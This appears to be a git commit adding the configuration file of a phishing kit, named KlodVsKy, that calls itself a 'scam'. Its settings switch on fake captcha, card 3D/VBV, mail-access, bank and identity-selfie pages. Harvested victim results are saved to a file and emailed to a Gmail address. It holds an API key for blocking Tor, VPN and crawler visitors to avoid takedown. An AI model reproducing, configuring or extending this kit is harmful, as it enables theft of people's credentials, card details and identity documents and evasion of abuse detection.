69874d77d65052c9758a88a5d9e4c147071f3c53
CreativeYT <62190104+CreativeYT@users.noreply.github.com>
2021-02-09 23:52:38 +0200

    h

---
+++ extra/mine.php
@@ -0,0 +1,62 @@
+<?php
+/*
+SH33NZ0 Is Dead 
+  _      _               _  _   _        _            
+ ( )    (_ )            ( )( ) ( )      ( )           
+ | |/ )  |(|    _      _| || | | |  ___ | |/ )  _   _ 
+ |   (   |()  / _ \  / _  || | | |/  __)|   (  ( ) ( )
+ | |\ \  | | ( (_) )( (_| || \_/ |\__  \| |\ \ | (_) |
+ ( ) ( )( (_) \ __/  ) _ _) \___/ (__(_/( ) ( ) \__  |
+ /(  /( (_)   /(    (__)            /(  /(  /( ( )_| |
+(__)(__)     (__)                  (__)(__)(__) \___/ 
+
+Now its KlodVsKy Time
+Wlecome Back KlodV$Ky
+*/
+	// ================================= //
+	// ================================= //
+	$redirectlink = "localhost";	 	 // You must use redirect or the scam will not open
+	// ================================= //
+	// ================================= //
+	// This is your Scama Key if you post the scam will banned Don`t edit it =D
+	$API_KEY = "KLODVSKY";
+	// This is your Scama Key if you post the scam will banned Don`t edit it =D
+	// ================================= //
+	// ================================= //
+	$scamname = "♣ KlodVsky ♣";	    		 // *Change |xAthena| to any name you want |Your Nick Name|
+	// ================================= //
+	// ================================= //
+	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
+	$filename = "stored"; // Change |stored| to any name you want this will be the Rzlt file name
+	// ================================= //
+	// ================================= //
+	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
+	$yours = "2lmo7tarefan@gmail.com"; 	 // <-- 💎 Your Email Here 💎 
+	// ================================= //
+	// ================================= //
+	$show_captcha ="yes"; 				 // If you don`t want to show ||Captcha Page|| edit |yes| to |no| 
+	$show_unusual_activity ="no"; 		 // If you don`t want to show ||Unusual Activity|| edit |yes| to |no|
+	$show_3D_VBV ="yes"; 				 // If you don`t want to show ||3D/VBV Page|| edit |yes| to |no| 
+	$show_mailaccess ="yes"; 			 // If you don`t want to show ||Mail Access Page|| edit |yes| to |no| 
+    $show_2ndmailaccess ="no"; 			 // If you don`t want to show 2nd ||Mail Access Page|| edit |yes| to |no|
+	$show_bank ="no"; 					 // If you don`t want to show ||Bank Page|| edit |yes| to |no| 
+	$show_identity ="yes"; 				 // If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
+	// ================================= //
+	// ================================= //
+	// ********* IP Protection ********* //
+	$ip_protection = "no"; 			 // If you don`t want to use IP Protection change yes to no
+	$ip_protection_api = "r7mXQAG01mKYGj5cYEQc1COV7WMwAOTi"; // Dont touch :()
+	$max_fraud_score = "75";			// Put max fraud score 
+	$fuck_tor = "true";					// If you don`t want to disallow Tor Users change true to xAthena
+	$fuck_vpn = "true";					// If you don`t want to disallow VPN Users change true to xAthena
+	$fuck_crawler = "true";				// If you don`t want to disallow Crawler Users change true to xAthena
+	// ================================= //
+	// ================================= //
+	/////////////////DATE-function//////////////////////
+	function now() {
+		date_default_timezone_set('GMT');
+		return date("d/m/Y h:i:sa");
+	}
+	/////////////////DATE-function//////////////////////
+
+?>
